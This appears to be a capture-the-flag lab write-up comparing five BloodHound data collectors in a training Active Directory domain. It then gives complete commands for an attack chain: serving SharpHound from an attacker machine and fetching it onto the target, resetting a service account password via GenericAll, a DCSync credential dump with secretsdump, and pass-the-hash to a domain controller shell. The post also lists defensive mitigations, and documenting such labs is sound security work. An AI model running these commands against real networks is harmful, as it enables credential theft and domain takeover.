---
title: "Five Ways to Collect BloodHound Data in Active Directory"
description: "Hands-on comparison of NetExec, SharpHound, RustHound-CE, BloodHound.py and bloodyAD, followed by ACL abuse and a validated DCSync attack in a HackSmarter lab."
pubDate: 2026-11-13
heroImage: "/images/labs/bloodhound.png"
category: "Active Directory"
difficulty: "Easy"
tags: ["Active Directory", "BloodHound", "Enumeration", "ACL", "DCSync", "HackSmarter"]
---

> **Lab:** HackSmarter — Domain Controller (BloodHound Lab)  
> **Environment:** `hacksmarter.hsm` | `DC01` | Windows Server 2022  
> **Scope:** Authorized training environment. Credentials, hashes and flags are intentionally redacted.

## Overview

BloodHound turns Active Directory relationships into a graph, helping identify privilege escalation paths that are easy to miss during manual enumeration. In this lab, I tested **five collection workflows** using an assumed-breach account, compared their outputs and limitations, then used the graph to find and validate a path to Domain Administrator.

The key lesson: **data collection is not the objective; interpreting permissions and validating a viable attack path is.**

## Lab setup and initial reconnaissance

The lab provided low-privileged access as `pentest` to `hacksmarter.hsm`. The domain controller was `dc01.hacksmarter.hsm` (`10.1.138.50`).

```bash
rustscan -a 10.1.138.50 -- -A
```

The scan exposed the expected AD services: DNS (53), Kerberos (88), LDAP (389), SMB (445), LDAPS (636), Global Catalog (3268/3269), WinRM (5985) and AD Web Services (9389). Nmap identified Windows Server 2022 and reported **SMB signing required**.

I confirmed the provided account could authenticate to SMB and read the standard `NETLOGON` and `SYSVOL` shares:

```bash
nxc smb dc01.hacksmarter.hsm -u pentest -p '<LAB_PASSWORD>' --shares
```

## Five BloodHound collection methods

Each collector has different prerequisites and coverage. A successful run does **not** guarantee that every session, local administrator or ACL relationship was collected.

### 1. NetExec — collect remotely over LDAP

```bash
nxc ldap 10.1.138.50 -u pentest -p '<LAB_PASSWORD>' \
  --bloodhound --collection All --dns-server 10.1.138.50
```

The first attempt failed because the NetExec environment was configured for **BloodHound Community Edition**, but a legacy BloodHound Python dependency was installed. After reinstalling NetExec from its upstream repository, the collection completed in approximately **1 minute 26 seconds** and produced a ZIP archive under `~/.nxc/logs/`.

```bash
# Commands used in this lab to replace the packaged NetExec installation
sudo apt remove netexec
pipx install git+https://github.com/Pennyw0rth/NetExec
```

**Troubleshooting note:** Reinstallation was my lab workaround, not a universal requirement. The original error also suggested fixing the `bloodhound-ce` dependency inside NetExec's pipx environment. Match your collector version and output format to the BloodHound edition you use.

### 2. SharpHound — collect from a Windows foothold

Because the supplied user could establish a WinRM session, I tested the Windows-native SharpHound collector.

```bash
evil-winrm -i dc01.hacksmarter.hsm -u pentest -p '<LAB_PASSWORD>'
```

I served the collector from Kali, transferred it to the lab host and executed it:

```bash
# Kali: run in the directory containing SharpHound.exe
python3 -m http.server 8000
```

```powershell
# Evil-WinRM session
Invoke-WebRequest -Uri 'http://<KALI_IP>:8000/SharpHound.exe' -OutFile '.\SharpHound.exe'
.\SharpHound.exe -c All
```

SharpHound reported **310 objects processed** and created `20261101082741_BloodHound.zip` in the working directory. This method is useful when Windows execution is available, but it requires transferring and running a binary on the target. Use a collector version compatible with your BloodHound deployment.

### 3. RustHound-CE — remote collection from Linux

```bash
rusthound -d hacksmarter.hsm -u pentest -p '<LAB_PASSWORD>' \
  -n 10.1.138.50 -o ./rusthound_output
```

RustHound-CE successfully queried LDAP and generated JSON data. Its output included **17 users, 60 groups, 1 computer, 2 GPOs and 1 domain**.

Not every collection category succeeded: session enumeration returned access-denied messages, and local-group enumeration timed out. These are important coverage limitations, **not evidence that no such relationships exist**.

### 4. BloodHound.py — legacy Python collector

```bash
bloodhound-python -u pentest -p '<LAB_PASSWORD>' \
  -d hacksmarter.hsm -dc dc01.hacksmarter.hsm \
  -c All -ns 10.1.138.50
```

The installed tool explicitly identified itself as a **BloodHound Legacy** collector. It discovered **17 users, 52 groups, 1 computer and 2 GPOs**, but reported an RPC/NetBIOS timeout during computer enumeration.

This is a useful comparison: LDAP enumeration can succeed while host-based collection fails. Legacy output should not be assumed compatible with every BloodHound CE workflow.

### 5. bloodyAD — LDAP-oriented BloodHound export

```bash
bloodyad -H dc01.hacksmarter.hsm -d hacksmarter.hsm \
  -u pentest -p '<LAB_PASSWORD>' get bloodhound
```

bloodyAD dumped schema information, security descriptors and directory objects, then saved `20261101T091412_Bloodhound.zip`. Its progress log reported **92 security descriptors, 16 users, 48 groups, 1 computer and 2 GPOs**.

The counts differ between tools because of implementation details, filtering and collection scope. They should **not** be interpreted as a direct measure of which collector is best.

## Comparing the collectors

| Collector | Execution location | Observation from this lab |
| --- | --- | --- |
| NetExec | Kali / remote LDAP | Completed after dependency fix; ZIP output |
| SharpHound | Windows host via WinRM | Processed 310 objects; ZIP output |
| RustHound-CE | Kali / remote LDAP and host queries | Generated JSON; sessions/local groups limited |
| BloodHound.py | Kali / remote LDAP and RPC | Legacy collector; RPC timeout |
| bloodyAD | Kali / remote LDAP | Exported security descriptors and AD objects |

**Practical takeaway:** Choose a collector based on access, protocol reachability, compatibility and the relationships you need. Cross-check suspicious or missing edges before making conclusions.

## Importing and analyzing the BloodHound graph

After importing the compatible collection data into BloodHound, I inspected the initial `pentest` user and privileged group relationships.

![BloodHound graph showing the initial pentest account](/images/bloodhound-lab/pentest.png)
*Initial graph exploration from the low-privileged `pentest` account.*

![BloodHound view of Domain Admins](/images/bloodhound-lab/domainadmins.png)
*Reviewing privileged group relationships in the domain.*

### Finding 1: `pentest` has GenericAll over `backup_svc`

The graph exposed a **GenericAll** relationship from `pentest` to `backup_svc`. GenericAll provides broad control over the target AD object, which can permit a password reset under appropriate conditions.

I validated the path by resetting the service account's password in the lab:

```bash
bloodyad -d hacksmarter.hsm -u pentest -p '<LAB_PASSWORD>' \
  --dc-ip 10.1.138.50 set password backup_svc '<NEW_LAB_PASSWORD>'
```

```text
[+] Password changed successfully!
```

I then confirmed that the new credentials worked:

```bash
nxc smb 10.1.138.50 -u backup_svc -p '<NEW_LAB_PASSWORD>'
```

```text
[+] hacksmarter.hsm\backup_svc:********
```

### Finding 2: `backup_svc` can perform directory replication

![BloodHound graph showing the backup_svc relationship](/images/bloodhound-lab/backup_svc.png)
*Investigating the replication-related permissions associated with `backup_svc`.*

The next relationship indicated replication-related privileges. **GetChanges alone is not sufficient to assume a DCSync attack will work**; the effective combination of directory replication permissions must be verified. Rather than relying on the graph label alone, I tested whether the account could request the Administrator's directory secrets.

```bash
impacket-secretsdump -just-dc-user Administrator \
  'hacksmarter.hsm/backup_svc:<NEW_LAB_PASSWORD>@10.1.138.50'
```

```text
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:<REDACTED_LM_HASH>:<REDACTED_NT_HASH>:::
[*] Kerberos keys grabbed
[*] Cleaning up...
```

The DRSUAPI operation succeeded, confirming that the account had **sufficient effective replication rights to retrieve the Administrator's credentials**.

### Validating domain compromise

Finally, I used the recovered Administrator NT hash for pass-the-hash authentication through Impacket PsExec:

```bash
impacket-psexec -hashes :'<ADMIN_NT_HASH>' \
  'hacksmarter.hsm/Administrator@10.1.138.50'
```

The connection succeeded, a remote service was started, and I obtained an administrative command shell on the domain controller. I also verified access to the lab's `root.txt` proof file. The flag and credential material are intentionally omitted from this public write-up.

## Attack path summary

```text
Assumed-breach credentials: pentest
            |
            v
BloodHound collection and graph analysis
            |
            v
GenericAll over backup_svc
            |
            v
Reset backup_svc password and authenticate
            |
            v
Validate effective DCSync permissions
            |
            v
Retrieve Administrator credential material
            |
            v
Pass-the-hash to DC01 -> administrative shell
```

## Security implications and mitigations

The critical failure was **excessive delegated control**. A low-privileged user could control a service account, and that account possessed effective directory replication rights. Together, those permissions formed a complete domain-compromise path.

Defenders should audit sensitive ACLs and ownership, remove unnecessary `GenericAll` and replication permissions, restrict DCSync rights to authorized principals, monitor suspicious password resets and replication activity, and regularly validate attack paths with tools such as BloodHound.

## Lessons learned

- Multiple collectors can reveal overlapping but incomplete views of the same domain.
- A tool's successful completion does not mean every relationship was enumerated.
- BloodHound edges are hypotheses to investigate; effective access must be verified.
- Excessive permissions on a service account can turn an ordinary user foothold into domain-wide compromise.
- Keeping concise evidence and documenting collection failures makes a write-up more useful than dumping entire terminal sessions.

## References

- [BloodHound and SharpHound — SpecterOps](https://bloodhound.specterops.io/)
- [NetExec](https://www.netexec.wiki/)
- [RustHound-CE](https://github.com/g0h4n/RustHound-CE)
- [BloodHound.py](https://github.com/dirkjanm/BloodHound.py)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)

*All activity was performed in an authorized HackSmarter training lab.*
